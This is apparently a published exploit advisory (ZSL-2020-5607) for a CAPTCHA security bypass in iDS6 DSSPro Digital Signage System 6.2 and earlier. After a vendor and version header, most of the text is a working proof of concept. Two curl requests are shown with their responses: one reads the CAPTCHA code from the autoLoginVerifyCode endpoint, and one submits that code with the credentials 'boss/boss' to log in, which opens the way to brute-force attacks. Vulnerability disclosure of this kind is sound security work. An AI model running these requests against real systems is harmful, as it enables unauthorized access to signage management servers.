@@ -1,0 +1,77 @@
+# Exploit Title: iDS6 DSSPro Digital Signage System 6.2 - CAPTCHA Security Bypass
+# Date: 2020-07-16
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.yerootech.com
+# Version: 6.2
+
+iDS6 DSSPro Digital Signage System 6.2 CAPTCHA Security Bypass
+
+
+Vendor: Guangzhou Yeroo Tech Co., Ltd.
+Product web page: http://www.yerootech.com
+Affected version: V6.2 B2014.12.12.1220
+                  V5.6 B2017.07.12.1757
+                  V4.3
+
+Summary: iDS6 Software's DSSPro network digital signage management
+system is a web-based server software solution for Windows.
+
+Desc: The CAPTCHA function for DSSPro is prone to a security bypass
+vulnerability that occurs in the CAPTCHA authentication routine. By
+requesting the autoLoginVerifyCode object an attacker can receive a
+JSON message code and successfully bypass the CAPTCHA-based authentication
+challenge and perform brute-force attacks.
+
+Tested on: Microsoft Windows XP
+           Microsoft Windows 7
+           Microsfot Windows Server 2008
+           Microsoft Windows Server 2012
+           Microsoft Windows 10
+           Apache Tomcat/8.0.44
+           Apache Tomcat/6.0.35
+           Apache-Coyote/1.1
+           Apache Axis/1.4
+           MySQL 5.5.25
+           Java 1.8.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5607
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5607.php
+
+
+16.07.2020
+
+--
+
+
+Get CAPTCHA code:
+-----------------
+
+$ curl -i http://192.168.1.88/Pages/login\!autoLoginVerifyCode -c cookies.txt
+
+{"success":true,"message":"6435","data":"6435"}
+
+
+Use CAPTCHA code:
+-----------------
+
+$ curl -i http://192.168.1.88/Pages/login\!userValidate -b cookies.txt -d "shortName=&user.userName=boss&user.password=boss&loginVerifyCode=6435&autoSave=true&autoLogin=true&domain_login=" -v
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Set-Cookie: cookie.username=boss; Expires=Wed, 21-Jul-2021 19:41:26 GMT
+Set-Cookie: cookie.password=boss; Expires=Wed, 01-Jul-2021 19:41:26 GMT
+Set-Cookie: cookie.autosave=true; Expires=Wed, 01-Jul-2021 19:41:26 GMT
+Set-Cookie: cookie.autologin=true; Expires=Wed, 01-Jul-2021 19:41:26 GMT
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/x-json;charset=UTF-8
+Date: Tue, 21 Jul 2020 19:41:26 GMT
+Connection: close
+Content-Length: 16
+
+{"success":true}
